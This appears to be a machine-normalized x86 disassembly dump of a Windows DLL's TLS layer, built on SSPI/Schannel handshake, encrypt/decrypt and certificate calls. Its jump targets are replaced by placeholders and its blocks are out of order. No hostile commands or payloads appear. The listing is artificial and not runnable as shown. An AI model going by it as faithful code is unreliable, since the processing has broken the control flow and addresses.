mov eax sub_1000572d
call sub_1000556c
push esi
mov esi ecx
push [ ebp + 0x18 ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x18 ] esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx esi
call sub_1000385c
or [ ebp - 0x4 ] 0xffffffff
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ esi ] r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
mov ecx [ ebp - 0xc ]
mov eax esi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x14
sub_10003996
mov eax sub_10005766
call sub_1000556c
sub esp 0xcc
and [ ebp - 0x14 ] 0x0
push ebx
push esi
push edi
mov ebx ecx
push 0x2
pop edi
lea ecx [ ebp - 0x2c ]
mov eax [ ebx + 0x2c ]
xor esi esi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x40 ] 0x1
mov [ ebp - 0x58 ] 0x1
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x90312
lea ecx [ ebp - 0x74 ]
mov eax [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
mov eax [ eax ]
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
push ecx
mov eax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x3c ]
push esi
push ecx
push 0x10
push esi
push 0x8c11c
push esi
push [ ebx + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x2c ]
mov [ ebp - 0x28 ] edi
push [ ebx + 0x24 ]
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x44 ] esi
call [ eax + 0x18 ]
cmp eax esi
mov [ ebp - 0x10 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x90320
jne r-xdata
cmp [ ebp - 0x4c ] esi
je r-xdata
cmp eax 0x90312
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x5c ]
call sub_100047c6
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x3c ]
call sub_100047fa
mov al 0x1
push esi
lea ecx [ ebp - 0x5c ]
call sub_100047de
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x44 ] esi
je r-xdata
cmp eax esi
jge r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x5c ]
call sub_100047c6
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x3c ]
call sub_100047fa
xor al al
jmp r-xdata
cmp eax esi
je r-xdata
push [ ebp - 0x4c ]
mov ecx ebx
push [ ebp - 0x44 ]
call sub_100044a1
test al al
je r-xdata
cmp eax 0x80090318
je r-xdata
test [ ebp - 0x5f ] 0x40
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
cmp [ ebp - 0x1c ] 0x5
jne r-xdata
jl r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax esi
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax + 0x8 ] esi
mov [ eax ] esi
mov [ eax + 0x4 ] esi
push [ ebp - 0x20 ]
call [ malloc@IAT ]
mov edi [ ebp + 0x10 ]
cmp eax esi
pop ecx
mov [ edi + 0x8 ] eax
jne r-xdata
push 0x18
call operator new
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax esi
mov [ ebp - 0x4 ] 0x4
je r-xdata
cmp eax 0x90320
jne r-xdata
xor eax eax
push esi
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_10003927
jmp r-xdata
mov ebx [ ebx + 0x10 ]
cmp ebx esi
je r-xdata
push 0x18
xor eax eax
pop ecx
lea edi [ ebp - 0xd6 ]
mov [ ebp - 0xd8 ] si
push 0x32
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0xd8 ]
push eax
push [ ebx + 0x18 ]
call strlen
pop ecx
inc eax
push eax
push [ ebx + 0x18 ]
push esi
push esi
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0xd8 ]
push esi
push eax
push [ ebx + 0x28 ]
push [ ebx + 0x2c ]
push 0x1
call sub_10004925
add esp 0xc
lea esi [ ebp - 0x6c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call [ ebx + 0xc ]
and [ ebx + 0xc ] 0x0
add esp 0xc
xor esi esi
mov ecx [ ebp + 0xc ]
push [ ebp - 0x20 ]
mov ecx [ ecx ]
sub ecx [ ebp - 0x20 ]
add ecx [ ebp + 0x8 ]
push ecx
push eax
call [ memmove@IAT ]
mov eax [ ebp - 0x20 ]
add esp 0xc
mov [ edi ] eax
mov [ edi + 0x4 ] 0x2
jmp r-xdata
push 0x18
call operator new
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax esi
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push [ ebp - 0x10 ]
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_1000385c
jmp r-xdata
cmp [ ebp - 0x1c ] 0x5
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp eax esi
je r-xdata
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
call ebx
jmp r-xdata
and [ ebx + 0x14 ] 0x0
cmp [ ebx + 0xc ] esi
je r-xdata
xor eax eax
push esi
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_1000385c
jmp r-xdata
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax [ ebp + 0xc ]
push [ ebp - 0x20 ]
mov eax [ eax ]
sub eax [ ebp - 0x20 ]
add eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x8 ]
call [ memmove@IAT ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x20 ]
add esp 0xc
mov [ ecx ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x90312
je r-xdata
push ebx
call eax
pop ecx
jmp r-xdata
mov [ ebp + 0x10 ] eax
lea eax [ ebp + 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
sub_10003cee
mov eax sub_1000577a
call sub_1000556c
sub esp 0xc
mov eax [ ecx + 0x2c ]
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
push 0x4
push [ ecx + 0x28 ]
call [ eax + 0x2c ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push esi
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x10 ]
call sub_1000385c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call _CxxThrowException
sub_10003d71
mov eax sub_100057aa
call sub_1000556c
sub esp 0x40
push ebx
push esi
push edi
mov esi ecx
push 0x1
xor ebx ebx
mov eax [ esi + 0x2c ]
pop ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x48 ] ecx
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x30 ] bl
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x4c ] ebx
lea ecx [ ebp - 0x14 ]
push 0x2
mov [ ebp - 0x34 ] ecx
pop edi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] ebx
push ecx
mov [ ebp - 0x38 ] edi
push [ esi + 0x28 ]
mov [ ebp - 0x3c ] 0x4
call [ eax + 0x28 ]
cmp eax ebx
mov [ ebp - 0x18 ] eax
jge r-xdata
mov eax [ esi + 0x28 ]
lea edx [ ebp - 0x2c ]
push edx
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov ecx [ esi + 0x2c ]
push ebx
push ebx
push 0x10
push ebx
push 0xc11c
push ebx
push eax
push [ esi + 0x24 ]
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x34 ] ebx
call [ ecx + 0x18 ]
cmp eax ebx
jge r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov edi [ ebp - 0x34 ]
cmp edi ebx
je r-xdata
push 0x18
call operator new
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
xor eax eax
push [ ebp - 0x18 ]
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x1c ]
call sub_1000385c
jmp r-xdata
mov eax [ esi + 0x28 ]
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x20 ]
call sub_1000385c
jmp r-xdata
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4c ]
call sub_100047c6
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov al 0x1
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
cmp [ eax + 0x4 ] 0xffffffff
je r-xdata
push [ ebp - 0x3c ]
mov ecx esi
push edi
call sub_100044a1
cmp al bl
jne r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
push 0x1
mov ecx esi
call sub_1000470e
mov eax [ esi + 0x2c ]
push edi
call [ eax + 0x40 ]
push 0x18
call operator new
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0xd ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x20 ]
call sub_10003927
jmp r-xdata
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
mov [ ebp - 0x4 ] bl
call _CxxThrowException
sub_10003f32
mov eax sub_100057da
call sub_1000556c
sub esp 0x60
push ebx
push esi
lea eax [ ebp - 0x28 ]
push edi
mov edi ecx
push eax
call sub_10003cee
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x28 ]
add ecx edx
and [ ebp - 0x2c ] 0x0
add eax ecx
mov ecx [ edi + 0x2c ]
mov [ ebp - 0x60 ] ecx
lea ecx [ ebp - 0x5c ]
xor ebx ebx
mov [ ebp - 0x68 ] 0x4
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x6c ] ebx
push eax
mov [ ebp - 0x4 ] ebx
call [ malloc@IAT ]
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x28 ]
push ebx
add eax esi
push [ ebp + 0x8 ]
push eax
call memcpy
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x5c ] eax
add eax esi
mov [ ebp - 0x48 ] eax
add esp 0xc
mov [ ebp - 0x50 ] ebx
add eax ebx
mov [ ebp - 0x44 ] ecx
xor ebx ebx
lea ecx [ ebp - 0x6c ]
push ebx
push ecx
push ebx
push [ edi + 0x28 ]
mov [ ebp - 0x3c ] eax
mov eax [ edi + 0x2c ]
mov [ ebp - 0x58 ] 0x7
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x4c ] 0x1
mov [ ebp - 0x40 ] 0x6
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
call [ eax + 0x64 ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jge r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x50 ]
add eax ecx
mov ecx edi
add eax [ ebp - 0x44 ]
push eax
push esi
call sub_100044a1
test al al
push esi
jne r-xdata
cmp eax 0x80090317
je r-xdata
xor eax eax
push ebx
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_1000385c
jmp r-xdata
call [ free@IAT ]
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x6c ]
call sub_10004820
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
call [ free@IAT ]
push 0x18
call operator new
pop ecx
mov [ ebp - 0x14 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
push esi
call [ free@IAT ]
push 0x18
call operator new
pop ecx
mov [ ebp - 0x10 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call _CxxThrowException
xor eax eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x8 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_10003927
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xf ]
sub esp 0x10
mov ecx esp
mov [ ebp + 0x8 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x10 ]
call sub_1000385c
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call _CxxThrowException
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
call _CxxThrowException
sub_10004126
mov eax sub_1000580a
call sub_1000556c
sub esp 0x5c
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] ebx
mov esi ecx
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp + 0xc ]
add eax [ esi + 0x34 ]
push eax
mov [ ebp + 0xc ] eax
call [ malloc@IAT ]
cmp eax ebx
pop ecx
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ esi + 0x34 ]
mov edx [ ebp + 0xc ]
sub edx ecx
add ecx eax
push edx
push [ ebp + 0x8 ]
push ecx
call memcpy
mov eax [ esi + 0x34 ]
mov edi [ free@IAT ]
add esp 0xc
cmp eax ebx
jbe r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
cmp [ esi + 0x14 ] bl
je r-xdata
push eax
push [ esi + 0x3c ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
push [ esi + 0x3c ]
call edi
add esp 0x10
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
xor eax eax
push ebx
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x18 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_1000385c
jmp r-xdata
mov eax [ esi + 0x2c ]
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x64 ] 0x4
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x68 ] ebx
push 0x1
mov [ ebp - 0x48 ] ebx
pop ecx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x54 ] ecx
mov ecx [ ebp + 0xc ]
push ebx
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x50 ] ecx
lea ecx [ ebp - 0x68 ]
push ebx
push ecx
push [ esi + 0x28 ]
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x2c ] ebx
call [ eax + 0x68 ]
cmp eax 0x80090318
mov [ ebp - 0x14 ] eax
je r-xdata
lea eax [ ebp - 0x24 ]
mov ecx esi
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x10 ]
call sub_10003996
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call _CxxThrowException
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
lea ecx [ ebp - 0x68 ]
mov [ esi + 0x34 ] eax
call sub_10004820
jmp r-xdata
cmp eax ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x34 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
cmp eax 0x90317
je r-xdata
cmp eax 0x90321
je r-xdata
push [ ebp - 0x10 ]
call edi
pop ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
push ebx
call operator new
pop ecx
push ebx
push eax
mov ecx esi
call sub_10003f32
push 0x1
mov ecx esi
call sub_1000470e
push [ ebp - 0x10 ]
call edi
push 0x18
call operator new
pop ecx
mov [ ebp - 0x18 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
push 0x3
xor ecx ecx
mov [ ebp + 0x8 ] ebx
lea eax [ ebp - 0x4c ]
pop edx
cmp eax 0x90317
jne r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
call edi
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
xor eax eax
push ebx
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x10 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x18 ]
call sub_1000385c
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
push [ ebp - 0x10 ]
call edi
push 0x18
call operator new
pop ecx
mov [ ebp - 0x18 ] eax
pop ecx
cmp eax ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
add eax 0xc
dec edx
jne r-xdata
cmp [ eax + 0x4 ] 0x5
jne r-xdata
mov ecx eax
xor eax eax
push [ ebp - 0x14 ]
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x14 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x18 ]
call sub_1000385c
jmp r-xdata
cmp ecx ebx
jne r-xdata
cmp ecx ebx
je r-xdata
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
cmp eax ebx
jbe r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
push [ eax ]
push [ eax + 0x8 ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
mov eax [ ebp + 0x8 ]
add esp 0xc
mov eax [ eax ]
mov [ ebp + 0xc ] eax
jmp r-xdata
push eax
push [ ecx + 0x8 ]
mov ecx esi
call sub_100044cd
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x68 ]
call sub_10004820
cmp [ ebp - 0x14 ] 0x90321
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x68 ]
call sub_10004820
jmp r-xdata
push esi
call [ esi + 0x8 ]
cmp [ ebp + 0x8 ] ebx
pop ecx
lea eax [ ebp - 0x24 ]
mov [ esi + 0x14 ] 0x1
mov [ ebp - 0x18 ] ebx
push eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x10 ]
jmp r-xdata
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call [ memmove@IAT ]
mov eax [ ebp - 0x24 ]
push [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
call edi
add esp 0x10
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov ecx esi
call sub_10003996
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_100044a1
push esi
push edi
push [ esp + 0x10 ]
mov esi ecx
call ??2@YAPAXI@Z
push [ esp + 0x14 ]
mov edi eax
push [ esp + 0x14 ]
push edi
call memcpy
push [ esp + 0x20 ]
push edi
call [ esi ]
add esp 0x18
pop edi
pop esi
retn 0x8
sub_100044cd
push esi
push edi
push [ esp + 0x10 ]
mov esi ecx
call ??2@YAPAXI@Z
push [ esp + 0x14 ]
mov edi eax
push [ esp + 0x14 ]
push edi
call memcpy
push [ esp + 0x20 ]
push edi
call [ esi + 0x4 ]
add esp 0x18
pop edi
pop esi
retn 0x8
sub_100044fa
mov eax sub_10005828
call sub_1000556c
sub esp 0x1c
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x2c ] ebx
mov [ ebp - 0x10 ] esp
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or edi 0xffffffff
push 0x38
mov [ esi + 0x38 ] edi
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x14 ] bl
mov [ ebp - 0x4 ] ebx
call ??2@YAPAXI@Z
pop ecx
mov [ esi + 0x20 ] eax
push 0x8
call operator new
pop ecx
mov [ esi + 0x24 ] eax
push 0x8
call operator new
mov [ esi + 0x28 ] eax
mov eax [ esi + 0x24 ]
pop ecx
mov [ ebp - 0x4 ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
push 0x38
push ebx
mov [ eax + 0x4 ] edi
mov eax [ esi + 0x28 ]
mov [ eax ] edi
mov eax [ esi + 0x28 ]
mov [ eax + 0x4 ] edi
push [ esi + 0x20 ]
call memset
lea eax [ ebp - 0x18 ]
mov [ esi + 0x2c ] ebx
push eax
push ebx
mov [ esi + 0x30 ] ebx
mov [ ebp - 0x18 ] ebx
call sub_10004883
add esp 0x14
test al al
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x2c ] eax
push 0x18
call operator new
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x11 ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x28 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x1c ]
call sub_1000385c
jmp r-xdata
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push r--data
push eax
mov [ ebp - 0x4 ] edi
call _CxxThrowException
sub_100045f1
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x1c ] eax
xor ebx ebx
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x12 ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x28 ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x1c ]
call sub_1000385c
jmp r-xdata
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x1
call _CxxThrowException
sub_1000463f
mov eax sub_1000583e
call sub_1000556c
sub esp 0x18
mov eax [ ecx + 0x20 ]
push esi
xor esi esi
push edi
mov [ ebp - 0x10 ] esi
mov [ eax ] 0x4
cmp [ ebp - 0x10 ] esi
je r-xdata
mov eax [ ecx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ecx + 0x20 ]
lea edx [ ebp - 0x24 ]
or [ eax + 0x30 ] 0x1a
push edx
push [ ecx + 0x24 ]
mov eax [ ecx + 0x2c ]
push esi
push esi
push [ ecx + 0x20 ]
push esi
push 0x2
push rw-data
push esi
call [ eax + 0xc ]
mov edi eax
cmp edi esi
je r-xdata
mov eax [ ecx + 0x20 ]
lea edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
mov [ eax + 0x8 ] edx
cmp [ ebp - 0x10 ] esi
je r-xdata
push 0x18
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax esi
mov [ ebp - 0x4 ] esi
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
leave
retn 0x4
push [ ebp - 0x10 ]
call [ CertFreeCertificateContext@IAT ]
xor eax eax
push edi
lea eax [ ebp + 0xb ]
sub esp 0x10
mov ecx esp
mov [ ebp - 0x1c ] esp
push eax
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_1000385c
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x18 ] eax
